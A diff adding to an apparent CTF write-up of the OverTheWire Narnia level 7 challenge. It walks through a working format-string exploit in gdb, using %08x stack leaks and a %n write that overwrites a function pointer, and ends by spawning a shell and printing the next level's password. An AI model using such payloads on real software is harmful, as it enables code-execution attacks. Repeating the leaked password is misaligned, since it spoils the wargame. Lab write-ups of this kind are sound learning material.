@@ -214,3 +214,113 @@ Breakpoint 1, 0x08048685 in vuln ()
 (gdb) 
 
 Looks like the stack is the same; I'm going to chew on this for a bit... see y'all in a few
+
+====================================================================================
+With a bit of poking around I found what I wanted which is AAAA on the stack twice, once written, once read
+
+(gdb) r $(python -c'print "AAAA"+"%08x"*6')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c'print "AAAA"+"%08x"*6')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd65c)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10s $esp
+0xffffd640:	"`\326\377\377\200"
+0xffffd646:	""
+0xffffd647:	""
+0xffffd648:	"\334\330\377\377\070\202\004\b\270\326\377\377\224\332\377\367"
+0xffffd659:	""
+0xffffd65a:	""
+0xffffd65b:	""
+0xffffd65c:	"\340\206\004\bAAAA08048238ffffd6b8f7ffda9400000000080486e041414141"
+0xffffd695:	""
+0xffffd696:	""
+
+now we can start playing around with writing mem
+
+(gdb) r $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*5+"%n"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*5+"%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd65c)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10s $esp
+0xffffd640:	"`\326\377\377\200"
+0xffffd646:	""
+0xffffd647:	""
+0xffffd648:	"\336\330\377\377\070\202\004\b\270\326\377\377\224\332\377\367"
+0xffffd659:	""
+0xffffd65a:	""
+0xffffd65b:	""
+0xffffd65c:	","
+0xffffd65e:	""
+0xffffd65f:	""
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000002c in ?? ()
+(gdb) 
+
+Check it out!! it's breakable!!
+
+I want to write 0x8048706, so far I have 0x0000002c and this is the smallest it can get... I think...
+So I will overflow to the next byte to get 0x00008706. 
+
+(gdb) r $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%34530x"+"%n"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%34530x"+"%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd65c)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00008706 in ?? ()
+(gdb) 
+
+=================== Bad form solution =============================
+I call this solution "bad form" because I think there's a more elegant way of writing to ptrf() byte by byte. I will get to that in the next paragraph.
+I just tried this to see if it would work:
+
+0x8048706 is 134514438 in dec, remove the already printed 36 bytes from 134514438 and you get 134514402
+
+narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%134514402x"+"%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+
+ptrf() changed locations because im not in gdb.
+
+narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x6c\xd6\xff\xff"+"%08x"*4+"%134514402x"+"%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+$ 
+
+Splat ;)
